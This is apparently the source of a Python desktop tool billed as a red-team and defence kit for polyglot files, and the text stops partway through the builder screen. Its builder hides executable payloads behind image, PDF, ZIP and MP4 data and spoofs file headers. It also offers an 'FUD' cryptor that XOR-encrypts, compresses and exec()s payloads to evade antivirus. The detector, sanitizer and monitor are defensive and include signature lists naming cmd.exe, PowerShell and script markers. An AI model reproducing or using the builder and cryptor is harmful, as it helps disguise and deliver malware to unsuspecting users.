#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  POLYGLOT TOOLKIT v3.0 — Red Team + Shield Edition           ║
║  Builder + ML Detector + YARA + Sanitizer + Monitor          ║
║  Author: Mr-DS-ML-85                                         ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys, os, math, struct, zlib, base64, hashlib, shutil, random, time, platform, subprocess, json, logging, threading
from datetime import datetime
from pathlib import Path
from collections import deque

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QFrame, QStackedWidget, QFileDialog,
    QTextEdit, QLineEdit, QComboBox, QCheckBox, QProgressBar,
    QGroupBox, QGridLayout, QScrollArea, QSplitter, QMessageBox,
    QTabWidget, QSpinBox, QTreeWidget, QTreeWidgetItem, QHeaderView,
    QSizePolicy, QPlainTextEdit, QInputDialog
)
from PyQt6.QtCore import Qt, QTimer, QThread, pyqtSignal, QSize
from PyQt6.QtGui import QFont, QColor, QPalette, QIcon

import numpy as np

# ── Import engines ───────────────────────────────────────────
from engines.features import extract_features, analyze_file, get_feature_names, _shannon
from engines.model import PolyglotModel, HAS_CATBOOST
from engines.yara_engine import YaraEngine
from engines.generator import SyntheticGenerator
from engines.scanner import Scanner, ScanResult
from engines.quarantine import QuarantineManager
from engines.notifications import NotificationManager, Alert
from engines.monitor import FolderMonitor, HAS_WATCHDOG
from engines.config import Config

logger = logging.getLogger("polyglot_toolkit")

# ── Theme ────────────────────────────────────────────────────

class T:
    BG      = "#0a0e14"
    BG2     = "#111822"
    BG3     = "#1a2233"
    BG_IN   = "#0d1520"
    HOVER   = "#1e2d44"
    FG      = "#c5d0db"
    DIM     = "#556677"
    RED     = "#ff3333"
    GREEN   = "#22cc55"
    YELLOW  = "#ddaa22"
    BLUE    = "#3399ff"
    PURPLE  = "#aa55ff"
    CYAN    = "#22dddd"
    ORANGE  = "#f0883e"
    BORDER  = "#1e2d3d"

# ── Cross-platform notifications ─────────────────────────────

class Notifier:
    @staticmethod
    def send(title, message, urgency="normal"):
        try:
            s = platform.system()
            if s == "Linux":
                subprocess.run(["notify-send","-u",urgency,"-a","Polyglot Toolkit",title,message],
                             capture_output=True, timeout=5)
            elif s == "Darwin":
                subprocess.run(["osascript","-e",f'display notification "{message}" with title "{title}"'],
                             capture_output=True, timeout=5)
            elif s == "Windows":
                ps = f'''[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, ContentType = WindowsRuntime] | Out-Null
[Windows.Data.Xml.Dom.XmlDocument, Windows.Data.Xml.Dom.XmlDocument, ContentType = WindowsRuntime] | Out-Null
$t=[Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02)
$t.GetElementsByTagName("text")[0].AppendChild($t.CreateTextNode("{title}"))
$t.GetElementsByTagName("text")[1].AppendChild($t.CreateTextNode("{message}"))
[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier("Polyglot").Show([Windows.UI.Notifications.ToastNotification]::new($t))'''
                subprocess.run(["powershell","-Command",ps], capture_output=True, timeout=10)
        except: pass

    @staticmethod
    def beep():
        try:
            s = platform.system()
            if s == "Linux":
                subprocess.run(["paplay","/usr/share/sounds/freedesktop/stereo/alarm-clock-elapsed.oga"],
                             capture_output=True, timeout=3)
            elif s == "Darwin":
                subprocess.run(["afplay","/System/Library/Sounds/Glass.aiff"], capture_output=True, timeout=3)
            elif s == "Windows":
                import winsound; winsound.MessageBeep(0x30)
        except: pass


# ── Styled widget helpers ────────────────────────────────────

def btn(text, color=T.RED, bg=None):
    b = QPushButton(text)
    bg = bg or color
    b.setStyleSheet(f"QPushButton{{background:{bg};color:white;border:none;border-radius:6px;padding:10px 24px;font-weight:bold;font-size:13px}}QPushButton:hover{{background:{color}}}QPushButton:pressed{{background:{T.BG}}}")
    b.setCursor(Qt.CursorShape.PointingHandCursor)
    return b

def card(title="", icon=""):
    f = QFrame()
    f.setStyleSheet(f"QFrame{{background:{T.BG3};border:1px solid {T.BORDER};border-radius:10px}}")
    l = QVBoxLayout(f); l.setContentsMargins(18,14,18,14)
    if title:
        lbl = QLabel(f"{icon}  {title}" if icon else title)
        lbl.setStyleSheet(f"color:{T.BLUE};font-size:14px;font-weight:bold;border:none;")
        l.addWidget(lbl)
    return f, l

def stat_card(icon, value, label, color):
    c = QFrame()
    c.setStyleSheet(f"QFrame{{background:qlineargradient(x1:0,y1:0,x2:1,y2:1,stop:0 {T.BG3},stop:1 {T.BG2});border:1px solid {T.BORDER};border-radius:12px}}")
    l = QVBoxLayout(c); l.setAlignment(Qt.AlignmentFlag.AlignCenter); l.setSpacing(4)
    il = QLabel(icon); il.setStyleSheet(f"font-size:28px;border:none;"); il.setAlignment(Qt.AlignmentFlag.AlignCenter)
    vl = QLabel(str(value)); vl.setStyleSheet(f"color:{color};font-size:32px;font-weight:bold;border:none;font-family:Consolas,monospace;"); vl.setAlignment(Qt.AlignmentFlag.AlignCenter)
    nl = QLabel(label); nl.setStyleSheet(f"color:{T.DIM};font-size:11px;border:none;letter-spacing:1px;"); nl.setAlignment(Qt.AlignmentFlag.AlignCenter)
    l.addWidget(il); l.addWidget(vl); l.addWidget(nl)
    c._val = vl
    return c

def inp(placeholder=""):
    e = QLineEdit(); e.setPlaceholderText(placeholder)
    e.setStyleSheet(f"QLineEdit{{background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;padding:10px 14px;font-family:Consolas,monospace;font-size:13px}}QLineEdit:focus{{border:1px solid {T.RED}}}")
    return e

def combo(items):
    c = QComboBox(); c.addItems(items)
    c.setStyleSheet(f"QComboBox{{background:{T.BG_IN};color:{T.FG};border:1px solid {T.BORDER};border-radius:6px;padding:10px 14px;font-size:13px}}QComboBox:hover{{border:1px solid {T.RED}}}QComboBox::drop-down{{border:none;width:30px}}QComboBox QAbstractItemView{{background:{T.BG3};color:{T.FG};selection-background-color:{T.HOVER};border:1px solid {T.BORDER}}}")
    return c

def log_box():
    e = QTextEdit(); e.setReadOnly(True)
    e.setStyleSheet(f"QTextEdit{{background:{T.BG};color:{T.FG};border:1px solid {T.BORDER};border-radius:8px;padding:12px;font-family:Consolas,monospace;font-size:12px;selection-background-color:{T.RED}}}")
    return e

def append_log(widget, text, color=None):
    c = color or T.FG
    widget.append(f'<span style="color:{c}">{text}</span>')


# ── Builder Engine (from polyglot_tui.py) ────────────────────

class PolyglotBuilder:
    def entropy(self, data):
        if not data: return 0.0
        f=[0]*256
        for b in data: f[b]+=1
        l=len(data)
        return -sum((x/l)*math.log2(x/l) for x in f if x>0)

    def xor(self, data, key):
        k=(key*(len(data)//len(key)+1))[:len(data)]
        return bytes(a^b for a,b in zip(data,k))

    def fud(self, payload):
        key=os.urandom(32); enc=self.xor(payload,key); comp=zlib.compress(enc,9)
        stub=b'#!/usr/bin/env python3\nimport base64,zlib\n'
        stub+=f'k=bytes.fromhex("{key.hex()}")\n'.encode()
        stub+=b'd=base64.b85decode(b"'+base64.b85encode(comp)+b'")\n'
        stub+=b'd=bytes(a^b for a,b in zip(d,(k*(len(d)//len(k)+1))[:len(d)]))\n'
        stub+=b'exec(compile(zlib.decompress(d),"<fud>","exec"))\n'
        return stub

    def mime_confuse(self, data, ext):
        hdrs={'.jpg':b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01',
              '.png':b'\x89PNG\r\n\x1a\n','.gif':b'GIF89a\x01\x00\x01\x00',
              '.pdf':b'%PDF-1.4\n1 0 obj<</Type/Catalog>>endobj\n',
              '.mp4':b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00',
              '.zip':b'PK\x03\x04\x14\x00\x00\x00\x00\x00'}
        return hdrs.get(ext,b'')+data

    def build(self, cover_path, payload_path, output_path, container="jpeg",
              encrypt=False, fud=False, mime=False,
              payload_type=None, target_os="windows", arch="x86-64", stealth=False):
        # Delegate to TUI builder for full feature support (arch, target_os, overlay, etc.)
        from polyglot_tui import PolyglotBuilder as TUIBuilder
        tui = TUIBuilder()
        stats = tui.build(cover_path, payload_path, output_path,
                          container_type=container, encrypt=encrypt, fud=fud,
                          mime_confuse=mime, payload_type=payload_type,
                          target_os=target_os, arch=arch, stealth=stealth)
        return stats

    def _j(self,c,p):
        if c[:2]!=b'\xff\xd8': raise ValueError("Not JPEG")
        e=c.rfind(b'\xff\xd9')
        if e==-1: raise ValueError("No EOI")
        return c[:e+2]+b'\xff\xfe'+struct.pack('<H',min(len(p),65533))+p

    def _p(self,c,p):
        if c[:8]!=b'\x89PNG\r\n\x1a\n': raise ValueError("Not PNG")
        e=c.rfind(b'IEND')
        if e==-1: raise ValueError("No IEND")
        return c[:e+8]+p

    def _g(self,c,p):
        if c[:6] not in (b'GIF87a',b'GIF89a'): raise ValueError("Not GIF")
        e=c.rfind(b'\x3b')
        if e==-1: raise ValueError("No terminator")
        return c[:e+1]+b'\x00'*16+p

    def _d(self,c,p):
        if not c.startswith(b'%PDF'): raise ValueError("Not PDF")
        e=c.rfind(b'%%EOF')
        if e==-1: raise ValueError("No EOF")
        return c[:e+5]+b'\r\n'+p

    def _z(self,c,p):
        if c[:2]!=b'PK': raise ValueError("Not ZIP")
        e=c.rfind(b'\x50\x4b\x05\x06')
        if e==-1: raise ValueError("No EOCD")
        return c[:e]+p+c[e:]

    def _m(self,c,p):
        if b'ftyp' not in c[:20]: raise ValueError("Not MP4")
        return c+struct.pack('>I',len(p)+8)+b'free'+p


# ── Detector Engine ──────────────────────────────────────────

class PolyglotDetector:
    SIGS={'PE/EXE':b'MZ','ELF':b'\x7fELF','PDF':b'%PDF','ZIP':b'PK',
          'RAR':b'Rar!','7Z':b'7z','GZIP':b'\x1f\x8b','BAT':b'@echo',
          'PS1':b'powershell','SH':b'#!/bin/','CLASS':b'\xca\xfe\xba\xbe',
          'MACHO':b'\xfe\xed\xfa','LNK':b'\x4c\x00\x00\x00','VBS':b'CreateObject',
          'HTA':b'<hta:','SCRIPT':b'<script','CMD':b'cmd.exe',
          'PYTHON':b'#!/usr/bin/env python','APPLESCRIPT':b'osascript',
          'WSF':b'<job','HTA2':b'<HTA:'}

    def scan_file(self, fp):
        findings=[]
        try:
            with open(fp,'rb') as f: data=f.read()
        except Exception as e: return [{'type':'ERROR','detail':str(e),'severity':'error','offset':0}]
        ext=os.path.splitext(fp)[1].lower()
        ct=None
        if data[:2]==b'\xff\xd8': ct='JPEG'
        elif data[:8]==b'\x89PNG\r\n\x1a\n': ct='PNG'
        elif data[:6] in (b'GIF87a',b'GIF89a'): ct='GIF'
        elif data[:4]==b'%PDF': ct='PDF'
        elif data[:2]==b'PK': ct='ZIP'
        elif b'ftyp' in data[:20]: ct='MP4'
        elif data[:2]==b'MZ': ct='PE'
        elif data[:4]==b'\x7fELF': ct='ELF'
        exp={'.jpg':'JPEG','.jpeg':'JPEG','.png':'PNG','.gif':'GIF',
             '.pdf':'PDF','.zip':'ZIP','.mp4':'MP4'}.get(ext)
        if exp and ct and exp!=ct:
            findings.append({'type':'EXT_MISMATCH','detail':f'Ext={exp}, Content={ct}','severity':'critical','offset':0})
        for nm,sig in self.SIGS.items():
            off=data.find(sig,64)
            if off!=-1:
                findings.append({'type':'HIDDEN_SIG','detail':f'{nm} @ 0x{off:X}',
                    'severity':'critical' if nm in ('PE/EXE','ELF','LNK',
                    'SCRIPT','HTA','HTA2','VBS','PYTHON','APPLESCRIPT','WSF') else 'warning','offset':off})
        mkrs={'JPEG':(b'\xff\xd9',2),'PNG':(b'IEND',8),'GIF':(b'\x3b',1),'PDF':(b'%%EOF',5)}
        if ct in mkrs:
            m,ex=mkrs[ct]; pos=data.rfind(m)
            if pos!=-1 and pos+ex<len(data):
                findings.append({'type':'TRAILING','detail':f'{len(data)-pos-ex:,} bytes after {ct} end','severity':'critical','offset':pos+ex})
        ss=max(len(data)//8,1)
        for i in range(8):
            s=data[i*ss:(i+1)*ss]
            if len(s)>=100:
                a=np.frombuffer(s,dtype=np.uint8); c=np.bincount(a,minlength=256).astype(np.float64)
                p=c/c.sum(); p=p[p>0]; ent=float(-np.sum(p*np.log2(p)))
                if ent>7.5: findings.append({'type':'HIGH_ENT','detail':f'Sec {i+1}/8: {ent:.2f}','severity':'info','offset':i*ss})
        if data[:4]==b'%PDF' and data.find(b'MZ',100)!=-1:
            findings.append({'type':'MIME_CONF','detail':'PDF+PE','severity':'critical','offset':data.find(b'MZ',100)})
        return findings


# ── Sanitizer Engine ─────────────────────────────────────────

class PolyglotSanitizer:
    def sanitize(self, fp, backup=True):
        with open(fp,'rb') as f: data=f.read()
        orig=len(data); ext=os.path.splitext(fp)[1].lower()
        cleaned=None; det=None
        hdrs={('.jpg','.jpeg'):('JPEG',b'\xff\xd9',2),('.png',):('PNG',b'IEND',8),
              ('.gif',):('GIF',b'\x3b',1),('.pdf',):('PDF',b'%%EOF',5)}
        for exts,(nm,m,ex) in hdrs.items():
            if ext in exts or data[:2]==m[:2]:
                pos=data.rfind(m)
                if pos!=-1 and pos+ex<len(data): cleaned=data[:pos+ex]; det=nm
                break
        if ext=='.zip' or data[:2]==b'PK':
            eocd=data.rfind(b'\x50\x4b\x05\x06')
            if eocd!=-1 and eocd+22<len(data): cleaned=data[:eocd+22]; det='ZIP'
        if cleaned is None or len(cleaned)>=orig:
            return {'status':'clean','detail':f'{det or "?"}: clean','removed':0}
        if backup: shutil.copy2(fp,fp+'.bak')
        with open(fp,'wb') as f: f.write(cleaned)
        return {'status':'sanitized','detail':f'{det}: {orig-len(cleaned):,} bytes removed',
                'removed':orig-len(cleaned),'backup':fp+'.bak' if backup else None}


# ═════════════════════════════════════════════════════════════
# WORKER THREADS
# ═════════════════════════════════════════════════════════════

class ScanWorker(QThread):
    result = pyqtSignal(dict)
    progress = pyqtSignal(int, int)
    done = pyqtSignal(dict)

    def __init__(self, files, use_ml=False, model=None):
        super().__init__()
        self.files = files
        self.use_ml = use_ml
        self.model = model
        self.detector = PolyglotDetector()
        self.yara = YaraEngine()

    def run(self):
        results = []
        threats = 0
        threat_files = []  # Track files with threats for quarantine
        for i, fpath in enumerate(self.files):
            self.progress.emit(i+1, len(self.files))
            try:
                if self.use_ml and self.model and self.model.is_loaded:
                    feats = extract_features_from_file(fpath)
                    pred = self.model.predict_single(feats)
                    yara_matches, _ = self.yara.scan_file(fpath)
                    findings = self.detector.scan_file(fpath)
                    ml_risk = pred['risk_score']
                    ml_label = pred['label']
                    ml_level = pred['risk_level']
                    # Boost ML score when rule-based findings exist
                    if findings:
                        sev_map = {'critical': 95, 'high': 80, 'warning': 50, 'info': 20}
                        max_finding = max(sev_map.get(f['severity'], 0) for f in findings)
                        if max_finding > ml_risk:
                            ml_risk = float(max_finding)
                            ml_label = "polyglot"
                            ml_level = "critical" if ml_risk >= 90 else "high" if ml_risk >= 70 else "warning" if ml_risk >= 40 else "info"
                    r = {
                        'file': os.path.basename(fpath), 'path': fpath,
                        'ml_label': ml_label, 'ml_risk': ml_risk,
                        'ml_conf': pred['confidence'], 'ml_level': ml_level,
                        'yara_count': len(yara_matches),
                        'yara_rules': [m.rule_name for m in yara_matches],
                        'findings': len(findings),
                        'severity': 'critical' if ml_risk>=80 else 'high' if ml_risk>=60 else 'warning' if ml_risk>=40 else 'clean',
                    }
                    if ml_risk >= 50:
                        threats += 1
                        threat_files.append((fpath, findings))
                else:
                    findings = self.detector.scan_file(fpath)
                    crit = [f for f in findings if f['severity'] in ('critical','high')]
                    r = {
                        'file': os.path.basename(fpath), 'path': fpath,
                        'findings': len(findings), 'critical': len(crit),
                        'details': findings,
                        'severity': 'critical' if crit else 'warning' if findings else 'clean',
                    }
                    if crit:
                        threats += 1
                        threat_files.append((fpath, findings))
                        # Write to audit log
                        try:
                            audit_path = os.path.expanduser("~/.polyglot/audit.jsonl")
                            os.makedirs(os.path.dirname(audit_path), exist_ok=True)
                            import json as _json
                            from datetime import datetime as _dt
                            with open(audit_path, "a") as _af:
                                for _ff in crit:
                                    _entry = {"time": _dt.now().isoformat(), "file": os.path.basename(fpath),
                                             "severity": _ff.get("severity","warning"), "type": _ff.get("type",""),
                                             "detail": _ff.get("detail",""), "offset": _ff.get("offset",0),
                                             "source": "gui"}
                                    _af.write(_json.dumps(_entry) + "\n")
                        except Exception:
                            pass
                results.append(r)
                self.result.emit(r)
            except Exception as e:
                results.append({'file': os.path.basename(fpath), 'error': str(e), 'severity': 'error'})
        self.done.emit({'total': len(self.files), 'threats': threats, 'results': results, 'threat_files': threat_files})


class TrainWorker(QThread):
    log = pyqtSignal(str)
    done = pyqtSignal(dict)

    def __init__(self, n_samples=1000, task_type="GPU"):
        super().__init__()
        self.n_samples = n_samples
        self.task_type = task_type

    def run(self):
        try:
            self.log.emit(f"Generating {self.n_samples} synthetic samples...")
            gen = SyntheticGenerator(output_dir="samples")
            samples = gen.generate_all(self.n_samples)
            self.log.emit(f"Generated {len(samples)} samples")

            self.log.emit("Extracting features...")
            X, y = [], []
            for fpath, label in samples:
                try:
                    feats = extract_features_from_file(fpath)
                    X.append(feats)
                    y.append(label)
                except: pass
            X = np.array(X); y = np.array(y)
            self.log.emit(f"Features: {X.shape[0]} samples × {X.shape[1]} features")

            split = int(0.8 * len(X))
            X_train, X_eval = X[:split], X[split:]
            y_train, y_eval = y[:split], y[split:]

            model = PolyglotModel({'task_type': self.task_type})
            self.log.emit(f"Training CatBoost ({self.task_type})...")
            meta = model.train(X_train, y_train, X_eval, y_eval)
            model.save("models/polyglot_shield.cbm")
            self.log.emit(f"Model saved. Best iter: {meta.get('best_iteration', '?')}")

            imp = model.get_feature_importance(10)
            self.log.emit("Top features:")
            for name, score in imp:
                self.log.emit(f"  {name}: {score:.4f}")

            self.done.emit(meta)
        except Exception as e:
            self.log.emit(f"ERROR: {e}")
            self.done.emit({'error': str(e)})

from engines.features import extract_features_from_file


class MonitorWorker(QThread):
    alert = pyqtSignal(dict)
    stats = pyqtSignal(dict)

    def __init__(self):
        super().__init__()
        self.running = False
        self.watch_dir = None
        self.file_hashes = {}
        self.detector = PolyglotDetector()
        self._stats = {'scanned': 0, 'threats': 0, 'clean': 0}

    def start_watch(self, directory):
        self.watch_dir = directory
        self.running = True
        self.start()

    def stop_watch(self):
        self.running = False

    def run(self):
        exts = {'.jpg','.jpeg','.png','.gif','.bmp','.pdf','.doc','.docx',
                '.zip','.exe','.dll','.scr','.bat','.cmd','.ps1','.vbs',
                '.js','.hta','.lnk','.elf','.so','.mp4'}
        while self.running:
            try:
                for root, dirs, files in os.walk(self.watch_dir):
                    dirs[:] = [d for d in dirs if not d.startswith('.')]
                    for fname in files:
                        if not self.running: return
                        if os.path.splitext(fname)[1].lower() not in exts: continue
                        fpath = os.path.join(root, fname)
                        try:
                            st = os.stat(fpath); cur = (st.st_mtime, st.st_size)
                        except: continue
                        prev = self.file_hashes.get(fpath)
                        if prev is None or prev != cur:
                            self.file_hashes[fpath] = cur
                            self._scan(fpath)
                time.sleep(2)
            except: time.sleep(5)

    def _scan(self, fp):
        findings = self.detector.scan_file(fp)
        self._stats['scanned'] += 1
        crit = [f for f in findings if f['severity'] in ('critical','high')]
        if crit:
            self._stats['threats'] += 1
            alert = {
                'time': datetime.now().strftime('%H:%M:%S'),
                'file': os.path.basename(fp), 'path': fp,
                'severity': 'critical' if any(f['severity']=='critical' for f in crit) else 'high',
                'detail': '; '.join(f['detail'] for f in crit[:3]),
                'findings': findings,  # Pass findings for quarantine
            }
            self.alert_signal(alert)
            Notifier.send(f"THREAT: {os.path.basename(fp)}", alert['detail'][:200], "critical")
        else:
            self._stats['clean'] += 1
        self.stats.emit(self._stats.copy())

    def alert_signal(self, a):
        self.alert.emit(a)


# ═════════════════════════════════════════════════════════════
# MAIN APPLICATION
# ═════════════════════════════════════════════════════════════

class PolyglotApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("◆ Polyglot Toolkit v3.0 — Red Team + Shield Edition")
        self.setMinimumSize(1280, 800)
        self.resize(1400, 900)

        self.builder = PolyglotBuilder()
        self.detector = PolyglotDetector()
        self.sanitizer = PolyglotSanitizer()
        self.config = Config.load(str(Path(__file__).parent / "config.yaml"))

        self.model = PolyglotModel(self.config.model)
        model_path = "models/polyglot_shield.cbm"
        if Path(model_path).exists():
            try: self.model.load(model_path)
            except: pass

        self.scan_worker = None
        self.train_worker = None
        self.mon_worker = None

        self.counts = {'scanned':0,'threats':0,'sanitized':0,'built':0}

        # Init quarantine manager early (before UI build)
        self.q_manager = QuarantineManager(
            quarantine_dir=self.config.quarantine.get("dir","quarantine"),
            encrypt_names=self.config.quarantine.get("encrypt_names",True),
            max_size_mb=self.config.quarantine.get("max_size_mb",500),
            retain_days=self.config.quarantine.get("retain_days",30))


        # Global file path — upload once, use in all panels
        self.global_file = None
        self._apply_theme()
        self._build_ui()

    def _apply_theme(self):
        self.setStyleSheet(f"""
            QMainWindow{{background:{T.BG}}}QWidget{{background:{T.BG};color:{T.FG};font-family:'Segoe UI','SF Pro',sans-serif}}
            QScrollBar:vertical{{background:{T.BG2};width:10px;border-radius:5px}}QScrollBar::handle:vertical{{background:{T.BORDER};border-radius:5px;min-height:30px}}QScrollBar::handle:vertical:hover{{background:{T.DIM}}}QScrollBar::add-line:vertical,QScrollBar::sub-line:vertical{{height:0}}
            QCheckBox{{spacing:8px;font-size:13px}}QCheckBox::indicator{{width:18px;height:18px;border:2px solid {T.BORDER};border-radius:4px;background:{T.BG_IN}}}QCheckBox::indicator:checked{{background:{T.RED};border:2px solid {T.RED}}}
            QProgressBar{{background:{T.BG2};border:none;border-radius:4px;height:8px}}QProgressBar::chunk{{background:qlineargradient(x1:0,y1:0,x2:1,y2:0,stop:0 {T.RED},stop:1 {T.ORANGE});border-radius:4px}}
            QTreeWidget{{background:{T.BG};color:{T.FG};border:1px solid {T.BORDER};border-radius:8px;font-family:Consolas,monospace;font-size:12px}}QTreeWidget::item{{padding:4px}}QTreeWidget::item:selected{{background:{T.HOVER}}}QHeaderView::section{{background:{T.BG2};color:{T.FG};border:none;padding:8px;font-weight:bold}}
        """)

    def _build_ui(self):
        central = QWidget(); self.setCentralWidget(central)
        ml = QHBoxLayout(central); ml.setContentsMargins(0,0,0,0); ml.setSpacing(0)

        # Sidebar
        sb = QFrame(); sb.setFixedWidth(220)
        sb.setStyleSheet(f"QFrame{{background:{T.BG2};border-right:1px solid {T.BORDER}}}")
        sl = QVBoxLayout(sb); sl.setContentsMargins(0,0,0,0); sl.setSpacing(0)

        logo = QFrame(); logo.setStyleSheet(f"background:{T.BG};border:none;padding:20px;")
        ll = QVBoxLayout(logo)
        l1 = QLabel("◆ POLYGLOT"); l1.setStyleSheet(f"color:{T.RED};font-size:20px;font-weight:bold;font-family:Consolas,monospace;border:none;"); l1.setAlignment(Qt.AlignmentFlag.AlignCenter)
        l2 = QLabel("RED TEAM + SHIELD"); l2.setStyleSheet(f"color:{T.DIM};font-size:9px;letter-spacing:2px;border:none;"); l2.setAlignment(Qt.AlignmentFlag.AlignCenter)
        ll.addWidget(l1); ll.addWidget(l2); sl.addWidget(logo)

        sep = QFrame(); sep.setFixedHeight(1); sep.setStyleSheet(f"background:{T.BORDER};"); sl.addWidget(sep)

        self.nav = []
        items = [("◈","Dashboard",0),("◆","Builder",1),("⚠","Scanner",2),("▶","Monitor",3),
                 ("🧠","ML Training",4),("🛡","Quarantine",5),("📋","YARA Rules",6),
                 ("📜","Activity Log",7),("⚙","Settings",8),("📊","Report",9),
                 ("🔄","Recover .bak",10),("🌐","Server",11),("🔬","Deep Analysis",12),
                 ("📡","Monitoring",13),("🔍","Investigation",14),("📊","Benchmark",15),
                 ("🌐","Net Tools",16),("⬡","Hex Editor",17),("🔵","Blue Side",18)]
        for icon,label,idx in items:
            b = QPushButton(f"  {icon}   {label}"); b.setCursor(Qt.CursorShape.PointingHandCursor)
            b.setStyleSheet(self._nav_s(False)); b.clicked.connect(lambda checked,i=idx,b=b:self._switch(i,b))
            sl.addWidget(b); self.nav.append(b)
        sl.addStretch()
        v = QLabel("  v3.0 — Mr-DS-ML-85"); v.setStyleSheet(f"color:{T.DIM};font-size:10px;padding:10px;border:none;"); sl.addWidget(v)
        ml.addWidget(sb)

        # Stack — 19 panels matching nav order
        self.stack = QStackedWidget()
        pages = [
            self._pg_dashboard(),      # 0
            self._pg_builder(),        # 1
            self._pg_scanner(),        # 2
            self._pg_monitor(),        # 3
            self._pg_training(),       # 4
            self._pg_quarantine(),     # 5
            self._pg_yara(),           # 6
            self._pg_logs(),           # 7 Activity Log
            self._pg_settings(),       # 8
            self._pg_report(),         # 9
            self._pg_recover_bak(),    # 10
            self._pg_server(),         # 11
            self._pg_deep_analysis(),  # 12
            self._pg_monitoring_panel(), # 13
            self._pg_investigation(),  # 14
            self._pg_benchmark(),      # 15
            self._pg_network_tools(),  # 16
            self._pg_hex_editor(),     # 17
            self._pg_blue_side(),      # 18
        ]
        for pg in pages:
            self.stack.addWidget(pg)

        # Global file selector bar — visible on all panels
        content_widget = QWidget()
        content_layout = QVBoxLayout(content_widget)
        content_layout.setContentsMargins(0,0,0,0)
        content_layout.setSpacing(0)

        file_bar = QFrame()
        file_bar.setStyleSheet(f"background:{T.BG2};border-bottom:1px solid {T.BORDER};padding:6px 12px")
        file_bar.setFixedHeight(48)
        fbl = QHBoxLayout(file_bar); fbl.setContentsMargins(10,0,10,0)
        fbl.addWidget(QLabel("📁 File:"))
        self.global_file_label = QLabel("No file selected")
        self.global_file_label.setStyleSheet(f"color:{T.DIM};font-size:12px")
        fbl.addWidget(self.global_file_label, 1)
        gf_btn = btn("Browse File", T.BLUE)
        gf_btn.clicked.connect(self._browse_global_file)
        fbl.addWidget(gf_btn)
        gf_clear = btn("Clear", T.DIM)
        gf_clear.clicked.connect(self._clear_global_file)
        fbl.addWidget(gf_clear)
        content_layout.addWidget(file_bar)
        content_layout.addWidget(self.stack)
        ml.addWidget(content_widget)

    def _nav_s(self, active):
        if active:
            return f"QPushButton{{background:{T.BG3};color:{T.RED};border:none;border-left:3px solid {T.RED};padding:14px 20px;text-align:left;font-size:14px;font-weight:bold}}"
        return f"QPushButton{{background:transparent;color:{T.DIM};border:none;border-left:3px solid transparent;padding:14px 20px;text-align:left;font-size:14px}}QPushButton:hover{{background:{T.BG3};color:{T.FG}}}"

    def _switch(self, idx, btn):
        try:
            if hasattr(self, 'stack') and self.stack is not None:
                self.stack.setCurrentIndex(idx)
                for b in self.nav: b.setStyleSheet(self._nav_s(False))
                btn.setStyleSheet(self._nav_s(True))
        except RuntimeError:
            pass  # Stack was deleted

    # ── Dashboard ────────────────────────────────────────────

    def _pg_dashboard(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(20)
        h = QLabel("Dashboard"); h.setStyleSheet(f"font-size:28px;font-weight:bold;"); l.addWidget(h)

        sr = QHBoxLayout(); sr.setSpacing(15)
        self.d_scanned = stat_card("🔍","0","Files Scanned",T.BLUE)
        self.d_threats = stat_card("⚠","0","Threats Found",T.RED)
        self.d_sanitized = stat_card("🛡","0","Files Sanitized",T.GREEN)
        self.d_built = stat_card("◆","0","Polyglots Built",T.ORANGE)
        for c in [self.d_scanned,self.d_threats,self.d_sanitized,self.d_built]: sr.addWidget(c)
        l.addLayout(sr)

        bl = QHBoxLayout(); bl.setSpacing(15)
        ac, al = card("Recent Alerts","🔔"); self.d_alerts = log_box(); self.d_alerts.setMaximumHeight(300); al.addWidget(self.d_alerts); bl.addWidget(ac,2)

        qc, ql = card("Quick Actions","⚡"); ql.addSpacing(10)
        for text,cb in [("⚡ Quick Scan",self._quick_scan),("🛡 Quick Sanitize",self._quick_sanitize),
                        ("◆ Build Polyglot",lambda:self._switch(1,self.nav[1])),("▶ Start Monitor",lambda:self._switch(3,self.nav[3])),
                        ("🧠 Train Model",lambda:self._switch(4,self.nav[4]))]:
            b = btn(text, T.RED if "Scan" in text else T.GREEN if "San" in text else T.BLUE)
            b.clicked.connect(cb); ql.addWidget(b)
        ql.addStretch(); bl.addWidget(qc,1)
        l.addLayout(bl)
        return p

    # ── Builder ──────────────────────────────────────────────

    def _pg_builder(self):
        p = QWidget(); l = QVBoxLayout(p); l.setContentsMargins(30,25,30,25); l.setSpacing(15)
        l.addWidget(self._header("◆ Polyglot Builder", T.RED))

        ic, il = card("Input Files","📁")
        r = QHBoxLayout(); r.addWidget(QLabel("Cover:")); self.b_cover = inp("JPEG/PNG/GIF/PDF/ZIP/MP4/XLSX/DOCX..."); r.addWidget(self.b_cover,1)
        b=btn("Browse",T.DIM); b.clicked.connect(lambda:self._browse(self.b_cover)); r.addWidget(b)
        bg=btn("📌 Global",T.DIM); bg.clicked.connect(lambda: self.b_cover.setText(self.global_file) if self.global_file else QMessageBox.information(self,"No File","Browse a file using the top bar first.")); r.addWidget(bg)
        il.addLayout(r)
        r = QHBoxLayout(); r.addWidget(QLabel("Payload:")); self.b_payload = inp("EXE/ELF/Mach-O/BAT/VBS/script..."); r.addWidget(self.b_payload,1)
        b=btn("Browse",T.DIM); b.clicked.connect(lambda:self._browse(self.b_payload)); r.addWidget(b); il.addLayout(r)
        l.addWidget(ic)

        oc, ol = card("Attack Options","⚙")
        g = QGridLayout(); g.setSpacing(12)
        # Row 0: Container + Vector
        g.addWidget(QLabel("Container:"),0,0); self.b_type = combo(['JPEG','PNG','GIF','PDF','ZIP','MP4','XLSX','DOCX']); g.addWidget(self.b_type,0,1)
        g.addWidget(QLabel("Vector:"),0,2); self.b_vector = combo(['Standard Polyglot','FUD Cryptor','MIME Confusion','Covert Embedding']); g.addWidget(self.b_vector,0,3)
        # Row 1: Payload Type + Target OS
